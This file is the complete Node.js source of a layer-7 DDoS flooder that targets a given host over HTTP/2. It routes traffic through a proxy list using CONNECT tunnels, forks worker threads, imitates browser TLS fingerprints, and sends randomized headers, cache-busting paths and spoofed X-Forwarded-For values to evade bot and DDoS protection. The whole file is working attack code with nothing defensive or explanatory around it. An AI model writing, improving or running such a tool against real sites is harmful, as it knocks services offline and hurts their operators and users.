const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const acceptHeader = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
];

const cacheHeader = ['max-age=0','no-cache','no-store'];
const languageHeader = ['en-US,en;q=0.9','fr-FR,fr;q=0.9','de-DE,de;q=0.8'];
const fetchSite = ["same-origin","same-site","cross-site"];
const fetchMode = ["navigate","same-origin","no-cors","cors"];
const fetchDest = ["document","subresource","unknown"];

const cipherList = ["TLS_AES_128_GCM_SHA256","TLS_AES_256_GCM_SHA384","TLS_CHACHA20_POLY1305_SHA256"];
const currentCipher = cipherList[Math.floor(Math.random() * cipherList.length)];
const signatureAlgorithms = ["ecdsa_secp256r1_sha256","rsa_pss_rsae_sha256","rsa_pkcs1_sha256"];
const signatureAlgorithmsList = signatureAlgorithms.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256";

if (process.argv.length < 7) {
    console.log(`Usage: host time rate threads proxy.txt`);
    process.exit();
}

const secureProtocol = "TLSv1_2_method";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1;

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: signatureAlgorithmsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.log(`Target: ${args.target}`);
    console.log(`Duration: ${args.time} seconds`);
    console.log(`Rate: ${args.rate} req/s`);
    console.log(`Threads: ${args.threads}`);
    console.log(`Proxy File: ${args.proxyFile}`);

    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 100);
}

class NetSocket {
    http(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const connection = net.connect({ host: options.host, port: options.port });
        connection.setTimeout(options.timeout * 1000);
        connection.on("connect", () => connection.write(Buffer.from(payload)));
        connection.on("data", chunk => {
            if (chunk.toString().includes("HTTP/1.1 200")) return callback(connection);
            connection.destroy();
        });
        connection.on("timeout", () => connection.destroy());
    }
}

const netSocket = new NetSocket();

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}
function randomString(len) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    return Array.from({length: len}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? 443 : 80;

    const ua = `Mozilla/5.0 (${randomElement(["Windows NT 10.0","Macintosh","Linux"])}; rv:${randomString(2)}) Gecko/20100101 Firefox/${randomString(2)}.0`;

    const headers = {
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + randomString(3) + "=" + randomString(10),
        ":method": "GET",
        "accept": randomElement(acceptHeader),
        "accept-encoding": "gzip, deflate, br",
        "cache-control": randomElement(cacheHeader),
        "accept-language": randomElement(languageHeader),
        "sec-fetch-mode": randomElement(fetchMode),
        "sec-fetch-site": randomElement(fetchSite),
        "sec-fetch-dest": randomElement(fetchDest),
        "user-agent": ua,
        "X-Forwarded-For": parsedProxy[0]
    };

    netSocket.http({
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host,
        timeout: 5
    }, connection => {
        const tlsConn = tls.connect(parsedPort, parsedTarget.host, {
            ALPNProtocols: ["h2"],
            ciphers: currentCipher,
            sigalgs: signatureAlgorithms,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureOptions: secureOptions,
            secureContext: secureContext,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        });

        const client = http2.connect(parsedTarget.href, { createConnection: () => tlsConn });
        client.on("connect", () => {
            for (let i = 0; i < args.rate; i++) {
                const req = client.request(headers);
                req.on("response", () => {
                    req.close();
                    req.destroy();
                });
                req.end();
            }
        });
        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    });
}

setTimeout(() => process.exit(0), args.time * 1000);
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
